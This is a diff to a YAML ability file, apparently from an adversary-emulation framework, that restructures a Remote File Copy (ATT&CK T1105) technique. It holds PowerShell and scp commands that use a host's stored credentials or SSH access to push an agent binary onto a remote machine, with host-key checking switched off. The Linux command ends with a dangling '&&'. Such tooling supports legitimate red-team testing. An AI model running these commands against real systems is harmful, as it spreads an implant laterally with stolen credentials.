@@ -7,27 +7,30 @@
   technique:
     attack_id: T1105
     name: Remote File Copy
-  executors:
+  platforms:
     windows:
-      command: |
-        $username = "#{host.user.name}";
-        $password = "#{host.user.password}";
-        $secstr = New-Object -TypeName System.Security.SecureString;
-        $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
-        $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
-        $File = [System.IO.File]::ReadAllBytes("sandcat.exe");
-        $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
-        Copy-Item -Path sandcat.exe -Destination 'C:\Users\Public\' -ToSession $session
-      payload: sandcat.exe
+      psh:
+        command: |
+          $username = "#{host.user.name}";
+          $password = "#{host.user.password}";
+          $secstr = New-Object -TypeName System.Security.SecureString;
+          $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+          $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+          $File = [System.IO.File]::ReadAllBytes("sandcat.go-windows");
+          $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
+          Copy-Item -Path sandcat.go-windows -Destination 'C:\Users\Public\' -ToSession $session
+        payload: sandcat.go
     darwin:
-      command: |
-        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat-linux #{remote.ssh.cmd}:~
-      cleanup: |
-        ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat-linux'
-      payload: sandcat-linux
+      sh:
+        command: |
+          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~
+        cleanup: |
+          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'
+        payload: sandcat.go
     linux:
-      command: |
-        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat-linux #{remote.ssh.cmd}:~ &&
-      cleanup: |
-        ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat-linux'
-      payload: sandcat-linux
+      sh:
+        command: |
+          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~ &&
+        cleanup: |
+          ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm sandcat.go-linux'
+        payload: sandcat.go
